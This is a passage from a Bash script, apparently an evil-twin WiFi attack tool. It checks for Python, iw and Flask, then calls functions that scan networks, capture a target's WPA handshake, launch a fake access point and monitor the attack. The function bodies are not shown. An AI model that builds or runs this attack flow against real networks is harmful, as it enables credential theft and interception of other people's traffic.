                    echo "  Install with: apt install python3"
                    ;;
                "iw")
                    echo "  Install with: apt install iw"
                    ;;
            esac
            exit 1
         fi
    done
    if python3 -c "import flask" 2>/dev/null; then
        echo -e "  ${GREEN}[✓]${NC} flask"
    else
        echo -e "  ${RED}[✗]${NC} flask"
        log_error "Missing Flask module"
        echo "Install with: pip3 install flask"
        exit 1
    fi
    echo -e "${GREEN}✅ All dependencies are installed!${NC}\n"
    log_info "Plug in external WiFi adapter..."
    select_adapter
    scan_networks
    capture_handshake "$TARGET_BSSID" "$TARGET_CHANNEL" "$TARGET_SSID"
    select_interfaces 
    update_configs "$TARGET_BSSID" "$TARGET_CHANNEL" "$FAKE_SSID"
    start_evil_twin
    monitor_attack "$TARGET_BSSID"
}

main